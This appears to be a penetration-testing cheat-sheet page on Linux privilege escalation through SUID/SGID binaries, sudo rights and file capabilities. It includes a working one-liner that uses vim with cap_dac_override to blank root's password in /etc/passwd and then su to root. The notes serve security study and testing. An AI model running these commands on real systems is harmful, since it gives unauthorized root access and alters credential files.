# Permissions Abuse

### Special permissions

The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them

```shellscript
# Find SUID binaries
find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null

# Find SGID binaries 
find / -user root -perm -6000 -exec ls -ldb {} \\; 2>/dev/null

# Then check GTFObins
```

### Sudo Rights Abuse

```shellscript
# Check for sudo permissions for our current user
sudo -l 
```

### Capabilities

Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted

Capabilities we can abuse :

| **Capability**     | **Description**                                                                                                                                                                                                              |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks.                                                                                                                                                         |

```shellscript
# Enumerate capabilities 
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\;

# Exploit vim with cap_dac_overrride

# Enumerate the capability
getcap /usr/bin/vim.basic

# Modify /etc/passwd to remove the x of the root user => :wq! to exit
/usr/bin/vim.basic /etc/passwd
echo -e ':%s/^root:[^:]*:/root::/\\nwq!' | /usr/bin/vim.basic -es /etc/passwd
root::0:0:root:/root:/bin/bash

# Next we can su to login as root
```

{% embed url="https://juggernaut-sec.com/capabilities/" %}
